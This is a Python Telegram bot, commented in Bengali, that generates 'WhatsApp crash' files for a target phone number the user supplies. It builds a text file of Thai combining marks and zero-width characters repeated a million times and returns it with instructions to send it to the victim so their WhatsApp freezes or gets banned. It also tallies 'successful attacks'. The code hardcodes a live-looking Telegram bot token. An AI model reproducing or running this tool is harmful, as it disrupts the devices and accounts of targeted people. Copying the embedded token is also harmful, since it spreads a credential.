import logging
import sqlite3
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ১. আপনার টেলিগ্রাম বট টোকেন
TOKEN = "8512245764:AAG_mZvW6aw0jHvGIwckU9cTwUGt6-4zh-0"

# ২. ডেটাবেস সেটআপ (অ্যাটাক সংখ্যা ট্র্যাক করার জন্য)
def init_db():
    conn = sqlite3.connect('m_r_developer.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৩. বিশাল পেলোড ফাইল তৈরির ফাংশন (লাখ লাখ ক্যারেক্টার যুক্ত)
def create_crash_file(target_number):
    # বিশেষ ইউনিকোড যা রেন্ডারিং ইঞ্জিনকে লুপে ফেলে দেয়
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 25
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 30
    
    # প্রায় ১০ লক্ষ ক্যারেক্টারের কম্বিনেশন (অত্যন্ত শক্তিশালী)
    # আপনার ফোনের ওপর চাপ না পড়ার জন্য এটি সরাসরি ফাইলে রাইট হবে
    final_payload = (crash_pattern + invisible_mass) * 1000000 
    
    file_name = f"WHATSAPP_CRASH_{target_number}.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(final_payload)
    return file_name

# ৪. স্টার্ট কমান্ড এবং মেইন মেনু বাটন
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 Attack WhatsApp", callback_data='attack')],
        [InlineKeyboardButton("📊 Status", callback_data='status')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 **M R DEVELOPER CONTROL PANEL** 🔥\n\nনিচের বাটন থেকে আপনার কাজ শুরু করুন:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# ৫. বাটন ক্লিক হ্যান্ডলার
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'attack':
        await query.edit_message_text("টার্গেট হোয়াটসঅ্যাপ নম্বরটি দিন (যেমন: 8801XXXXXXXXX):")
        context.user_data['state'] = 'GET_NUMBER'
    
    elif query.data == 'status':
        conn = sqlite3.connect('m_r_developer.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await query.edit_message_text(f"📊 **বর্তমান স্ট্যাটাস**\n\nআজ পর্যন্ত মোট সফল অ্যাটাক: {total} টি")

# ৬. নম্বর প্রসেসিং এবং ফাইল সেন্ডিং
async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('state') == 'GET_NUMBER':
        target_num = update.message.text
        context.user_data['state'] = None
        
        status_msg = await update.message.reply_text(f"⏳ {target_num} এর জন্য শক্তিশালী ডাটা ফাইল তৈরি হচ্ছে...")
        
        try:
            # ফাইল তৈরি
            file_path = create_crash_file(target_num)
            
            # ফাইলটি বটের মাধ্যমে পাঠানো
            with open(file_path, 'rb') as document:
                await update.message.reply_document(
                    document=document,
                    caption=f"✅ সফল!\n\nটার্গেট: {target_num}\n\n⚠️ এই ফাইলটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান। সে এটি ওপেন করলে হোয়াটসঅ্যাপ ফ্রিজ বা ব্যান হওয়ার সম্ভাবনা থাকবে।"
                )
            
            # ডেটাবেস আপডেট
            conn = sqlite3.connect('m_r_developer.db')
            cur = conn.cursor()
            cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
            conn.commit()
            conn.close()
            
            # সাময়িক ফাইল ডিলিট
            os.remove(file_path)
            await status_msg.delete()
            
        except Exception as e:
            await update.message.reply_text(f"❌ এরর: {str(e)}")

# ৭. মেইন ফাংশন
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    print("M R DEVELOPER Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
    
